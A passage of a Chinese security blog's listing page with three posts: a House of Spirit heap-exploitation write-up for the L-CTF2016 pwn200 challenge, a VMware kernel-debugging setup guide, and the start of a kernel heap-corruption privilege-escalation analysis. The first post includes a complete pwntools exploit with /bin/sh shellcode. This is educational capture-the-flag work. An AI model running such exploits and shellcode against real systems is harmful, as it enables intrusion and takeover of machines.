<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/6/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-堆漏洞之House-of-Spirit" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/" class="article-date">
  <time datetime="2017-06-26T12:46:06.000Z" itemprop="datePublished">2017-06-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/">堆漏洞之House of Spirit</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这个漏洞利用的方式借之前做过的<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/10/19/L-CTF2016-PWN-Writeup/">一道题目</a>进行讲解，其中的pwn200之前是用修改got地址的方式，这里用House of Spirit的方式进行利用。</p>
<h2 id="House-of-Spirit原理"><a href="#House-of-Spirit原理" class="headerlink" title="House of Spirit原理"></a>House of Spirit原理</h2><p>House of Spirit的主要思想是覆盖一个堆指针，使其指向可控的区域，构造好相关数据，释放堆指针时系统会将该区域作为chunk放到fastbin里，再申请这块区域，这块区域就可能改写目标区域。shellphish的<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c">github</a>里有相关的原理介绍，但是可能会比较难懂，还是看题目比较具体。</p>
<h3 id="利用场景和思路"><a href="#利用场景和思路" class="headerlink" title="利用场景和思路"></a>利用场景和思路</h3><p>House of Spirit的利用场景如下：<br>（1）想要控制的目标区域的前面一段空间和后面一段空间都是可控的内存区域想要控制的目标区域一般为返回地址或函数指针，正常情况下，该区域是无法控制的。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">|     可控区域1     |</span><br><span class="line">+------------------+</span><br><span class="line">| 目标区域（不可控， |</span><br><span class="line">| 多为返回地址或函数 |</span><br><span class="line">| 指针等）          |</span><br><span class="line">+------------------+</span><br><span class="line">|     可控区域2     |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
<p>（2）存在可覆盖的堆指针<br>将堆指针覆盖为上图中的可控区域。<br>存在上述场景时，可按如下思路进行利用：<br>（1）伪造堆块，在可控区域1和2中构造数据，将目标区域伪造成一个fast chunk；<br>（2）覆盖堆指针指向伪造的fast chunk；<br>（3）释放伪造的fast chunk到fastbin单链表中；<br>（4）申请刚刚释放的chunk，使得可以向目标区域中写入数据。</p>
<blockquote>
<p>fastbin是一个单链表结构，遵循LIFO的规则，32位系统中的fastbin大小是16~64字节，64位是32~128字节之间。</p>
</blockquote>
<p>想要释放堆块到fastbin，需要满足一些限制，free时相关的<a target="_blank" rel="noopener" href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_free">源代码</a>如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里mmap标识位必须为0，否则会执行munmap_chunk函数。最后调用的<code>_int_free()</code>会检查：<br>（1）chunk的size不能超过fastbin的最大值（64位系统上为128）；<br>（2）下一个chunk的size要大于2 * SIZE_SZ，小于av-&gt;system_mem。<br>对应到上面的图，需要在可控区域1中伪造好size绕过mmap和size的检查，可控区域2伪造下一个chunk的size绕过最后一个检查。</p>
<h2 id="L-CTF2016-pwn200"><a href="#L-CTF2016-pwn200" class="headerlink" title="L-CTF2016 pwn200"></a>L-CTF2016 pwn200</h2><p>题目之前讲解过，这里就介绍House of Spirit的利用方式。<br>首先还是利用输入用户名这里的off by one漏洞，输入48个字符泄露rbp的值（rbp的值是上一个栈帧的栈底位置）。接着输入id，<code>input_num()</code>接收的数字保存在栈上rbp-0x38的位置，将这个值当做可控区域2中的下一个chunk的size。<br>最后输入money，输入的money可以覆盖dest堆指针，这满足前面说的覆盖堆指针的条件。同时这个money的空间也就是可控区域1。<br>利用思路如下：<br>（1）泄露rbp，覆盖堆指针指向栈；<br>（2）伪造chunk数据；<br>（3）将伪造的chunk释放到fastbin；<br>（4）申请chunk；<br>（5）写数据到chunk，覆盖目标区域。<br>构造栈如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+------------+-----</span><br><span class="line">|    ...     |</span><br><span class="line">+------------+</span><br><span class="line">|    0x41    | # 伪造的chunk size</span><br><span class="line">+------------+&lt;-fake_addr(ptr)</span><br><span class="line">|      0     |</span><br><span class="line">+------------+   ask_for_money栈帧(0x40)</span><br><span class="line">| fake_addr  | dest</span><br><span class="line">+------------+-----</span><br><span class="line">|     rbp    |</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----</span><br><span class="line">|    ...     |</span><br><span class="line">+------------+</span><br><span class="line">|     32     | id # 伪造的下一个chunk的size</span><br><span class="line">+------------+   welcome栈帧(0x50)</span><br><span class="line">|  shellcode | name(0x30)</span><br><span class="line">+------------+-----</span><br><span class="line">|     rbp    |</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----</span><br><span class="line">|    ...     |   main栈帧(0x10)</span><br><span class="line">+------------+&lt;----rbp_addr</span><br></pre></td></tr></table></figure>
<p>完整的exp如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&#x27;127.0.0.1&#x27;, 6666)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *0x400991&quot;)</span></span><br><span class="line"></span><br><span class="line">    data = shellcode.ljust(<span class="number">46</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    data += <span class="string">&#x27;bb&#x27;</span></span><br><span class="line">    p.send(data)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line">    rbp_addr = p.recvuntil(<span class="string">&#x27;, w&#x27;</span>)[:<span class="number">-3</span>]</span><br><span class="line">    rbp_addr = u64(rbp_addr.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(rbp_addr)</span><br><span class="line"></span><br><span class="line">    fake_addr = rbp_addr - <span class="number">0x90</span></span><br><span class="line">    shellcode_addr = rbp_addr - <span class="number">0x50</span></span><br><span class="line">    <span class="comment"># 输入id伪造下一个堆块的size</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id ~~?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;money~&#x27;</span>)</span><br><span class="line">    data = p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x41</span>) <span class="comment"># 伪造堆块的size</span></span><br><span class="line">    data = data.ljust(<span class="number">0x38</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(fake_addr) <span class="comment"># 覆盖堆指针</span></span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>) <span class="comment"># 释放伪堆块进入fastbin</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;long?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\n48\n&#x27;</span>) <span class="comment"># 将伪堆块申请出来</span></span><br><span class="line">    data = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(shellcode_addr) <span class="comment"># 将eip修改为shellcode的地址</span></span><br><span class="line">    data = data.ljust(<span class="number">48</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>) <span class="comment"># 退出返回时回去执行shellcode</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>House of Spirit的主要意思是我们想要控制的区域控制不了，但它前面和后面都可以控制，所以伪造好数据将它释放到fastbin里面，后面将该内存区域当做堆块申请出来，致使该区域被当做普通的内存使用，从而目标区域就变成了可控的了。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3417.html?utm_source=tuicool&utm_medium=referral#mao">堆之House of Spirit</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/" data-id="ckhe7o4ng005rchl71yk15q5t" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-VMware上进行Linux-Kernel调试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/06/24/VMware%E4%B8%8A%E8%BF%9B%E8%A1%8CLinux-Kernel%E8%B0%83%E8%AF%95/" class="article-date">
  <time datetime="2017-06-24T09:58:06.000Z" itemprop="datePublished">2017-06-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/06/24/VMware%E4%B8%8A%E8%BF%9B%E8%A1%8CLinux-Kernel%E8%B0%83%E8%AF%95/">VMware上进行Linux Kernel调试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>之前的Linux内核调试都是编译内核源码后，用qemu启动来调试，但是实际一些Linux的发行版还是需要用其他的虚拟机软件来进行调试，这里记录一下VMware调试环境的搭建过程。<br>主机是Ubuntu14.04 x86_64<br>VMware Workstation 12.5.6<br>虚拟机是Ubuntu12.04.5 x86_64<br>主机选择Ubuntu是因为需要用gdb对VMware中的Linux Kernel进行调试，选择这个版本的虚拟机是因为有一篇关于内核ROP的文章用到的这个版本，为了方便后面做实验选择这个版本。<br>配置过程如下：<br>1.安装Ubuntu12.04.5 x86_64虚拟机，安装vmware-tools。<br>2.修改虚拟机的配置文件：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cd vmware&#x2F;Ubuntu-12.04-64bit</span><br><span class="line">$ vim Ubuntu-12.04-64bit.vmx</span><br><span class="line">...</span><br><span class="line">debugStub.listen.guest64&#x3D;&quot;TRUE&quot;</span><br></pre></td></tr></table></figure>
<p>在配置文件的末尾加上<code>debugStub.listen.guest64=&quot;TRUE&quot;</code>。<br>3.将虚拟机的内核可执行文件提取出来：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo .&#x2F;extract-vmlinux &#x2F;boot&#x2F;vmlinuz-3.13.0-32-generic &gt; vmlinux</span><br><span class="line">$ file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]&#x3D;0x32143d561875c4e5f3229003aca99c880e2bedb2, stripped</span><br></pre></td></tr></table></figure>
<p>其中的<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>是用于解压Linux内核可执行文件的。有个问题就是符号表被去掉了，有一个方法是自己编译安装一个内核，这样内核可执行文件的符号表就不会被去掉了。<br>4.连接gdb开始调试<br>VMware虚拟机的调试服务是在主机的回环端口8864（32位虚拟机是8832），用gdb连接服务，调试虚拟机。将上一步中提取出的内核可执行文件拷贝到主机中，启动虚拟机，虚拟机启动完成后，在主机中执行：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ gdb vmlinux</span><br><span class="line">(gdb) set architecture i386:x86-64</span><br><span class="line">The target architecture is assumed to be i386:x86-64</span><br><span class="line">(gdb) target remote :8864</span><br><span class="line">Remote debugging using :8864</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><img src="/images/kerneldebug/vmwaredebug.png"><br>gdb中c继续运行，ctrl+c暂停。接下来就可以VMware中随意调试Linux Kernel了！<br><strong>补充</strong><br>前面介绍的是在Linux主机上的调试，但是Mac上就很不方便，gdb不能识别elf文件，所以我用了IDA来调试VMware上的Linux Kernel。方法和上面差不多，就是在虚拟机启动后，用IDA打开内核映像，选择Debugger为<code>Remote GDB debugger</code>，点击运行，配置host为127.0.0.1，port为8864（32位为8832）。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://jidanhunter.blogspot.com/2015/01/linux-kernel-debugging-with-vmware-and.html">Linux Kernel Debugging with VMware and GDB</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/grublinux/article/details/27229603">Vmware+gdb调试Linux内核</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/06/24/VMware%E4%B8%8A%E8%BF%9B%E8%A1%8CLinux-Kernel%E8%B0%83%E8%AF%95/" data-id="ckhe7o4mq004fchl7axt9go6v" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Exploiting-Linux-Kernel-Heap-Corruptions" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/06/12/Exploiting-Linux-Kernel-Heap-Corruptions/" class="article-date">
  <time datetime="2017-06-12T12:09:12.000Z" itemprop="datePublished">2017-06-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/06/12/Exploiting-Linux-Kernel-Heap-Corruptions/">Exploiting Linux Kernel Heap Corruptions</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这种类型的漏洞利用借助吾爱破解挑战赛的<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1boMJfxP">一个题目</a>进行学习，给了一个有问题的驱动程序。<br>让在Ubuntu14.04 32位系统环境下提权，Ubuntu14.04内核版本是3.14，我的测试环境是在qemu中启动的一个linux-3.10的内核版本。用qemu是为了方便调试。</p>
<h2 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h2><p>有漏洞的驱动关键代码如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">mem_read</span><span class="params">(struct file *filp, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> p =  *ppos;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> count = size;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((dev-&gt;size &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>) != <span class="number">0x5a</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p &gt; dev-&gt;size)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt; dev-&gt;size - p)</span><br><span class="line">        count = dev-&gt;size - p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(buf, (<span class="keyword">void</span>*)(dev-&gt;data + p), count)) &#123;</span><br><span class="line">        ret =  -EFAULT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *ppos += count;</span><br><span class="line">        ret = count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">mem_write</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> p =  *ppos;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> count = size;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((dev-&gt;size &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>) != <span class="number">0x5a</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p &gt; dev-&gt;size)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt; dev-&gt;size - p)</span><br><span class="line">        count = dev-&gt;size - p;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (copy_from_user((<span class="keyword">void</span> *)(dev-&gt;data + p), buf, count)) &#123;</span><br><span class="line">        ret = -EFAULT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *ppos += count;</span><br><span class="line">        ret = count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">mem_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_init</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!arg)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(copy_from_user(&amp;data, (<span class="keyword">void</span> *)arg, <span class="keyword">sizeof</span>(data))) &#123;</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(data.len &lt;= <span class="number">0</span> || data.len &gt;= <span class="number">0x1000000</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(data.idx &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            mem_devp[data.idx].size = <span class="number">0x5a000000</span> | (data.len &amp; <span class="number">0xffffff</span>);</span><br><span class="line">            mem_devp[data.idx].data = kmalloc(data.len, GFP_KERNEL);</span><br><span class="line">            <span class="keyword">if</span>(!mem_devp[data.idx].data) &#123;</span><br><span class="line">                <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(mem_devp[data.idx].data, <span class="number">0</span>, data.len);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的一个驱动对应了三个字符设备，通过<code>mem_open()</code>将打开的设备与驱动层的设备结构体对应起来，驱动层用一个结构体指针<code>mem_devp</code>指向了三个连续的<code>mem_dev</code>设备结构体。<br><code>mem_write()</code>里的<code>dev-&gt;data</code>是通过调用<code>mem_ioctl()</code>后<code>kmalloc()</code>出来的，kmalloc的size可以自行指定。但是mem_write()可以写0x5a0000000个字节。于是通过mem_write()，可以写内核堆，甚至写到内核栈里。<br>exploit的方法是覆盖内核某个堆结构，改掉其上的某个指针，最好是某个函数指针，或者函数表指针。这里是<code>shmid_kernel</code>结构的file结构体指针，里面存有<code>shm_ops</code>，这是shm的函数表，里面有<code>shm_mmap</code>，而这个函数可以在用户态通过<code>shmat()</code>调用到。<code>shmid_kernel</code>这个结构体，可以通过在用户层进行系统调用<code>shmget()</code>时，被kmalloc分配，分配的大小是96字节（确认大小的方法在后面的相关知识），因此会在大小为96的slab中分配。<br><strong>代码清单</strong> include/linux/shm.h: shmid_kernel  </p>
